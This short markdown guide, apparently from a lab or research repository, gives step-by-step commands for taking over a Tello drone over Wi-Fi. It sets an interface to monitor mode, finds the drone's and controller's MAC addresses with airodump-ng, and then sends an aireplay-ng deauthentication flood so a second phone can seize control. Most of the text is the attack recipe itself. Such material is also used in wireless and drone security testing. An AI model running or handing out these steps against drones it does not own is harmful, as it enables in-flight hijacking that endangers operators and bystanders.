# Steps for drone disruption

1. Open Ubuntu machine
2. Type the following commands:
   - `sudo ifconfig <interface> down`
   - `sudo iwconfig <interface> mode monitor`
   - `sudo ifconfig <interface> up`
<img width="773" height="506" alt="image" src="https://github.com/user-attachments/assets/ce816569-2b7e-4862-a7f1-de2431a6cb39" />

3. Connect device A (mobile Tello app) to get MAC addresses (No need to fly the drone)
<img width="783" height="342" alt="image" src="https://github.com/user-attachments/assets/00ba3643-e085-49e3-8ab4-a1cc954aafd6" />
<img width="847" height="453" alt="image" src="https://github.com/user-attachments/assets/83b8cd73-81e2-45ba-befb-0ee2d871dbfe" />

5. From Ubuntu machine, type:
   - `Sudo airodump-ng <interface>` to find the BSSID (MAC address) of the drone (34:D2:62:…..)
   - `Sudo airodump-ng –c <channel_#> <interface>` to get airodump-ng to be locked in the same channel
<img width="753" height="847" alt="image" src="https://github.com/user-attachments/assets/7af7c565-6f45-4d20-827d-95311d74ae87" />
<img width="753" height="847" alt="image" src="https://github.com/user-attachments/assets/b2828e0d-c29c-4f97-93e6-6f77ad2b5e9a" />

6. Run Wireshark to capture traffic for the interface **<interface>**
7. Connect device A (mobile Tello app) and fly the drone (move forward, rotate, etc. to capture these movements on Wireshark)
8. Run this command from your Ubuntu machine (while Wireshark is running)
   - `aireplay-ng --deauth <#_of_deauth_packets> -a <bssid_of_AP> -c <MAC_address_of_client> <interface>`
9. Connect device B (another mobile Tello app) and fly the drone
10. See if you can gain control from Device A again (while running Wireshark)
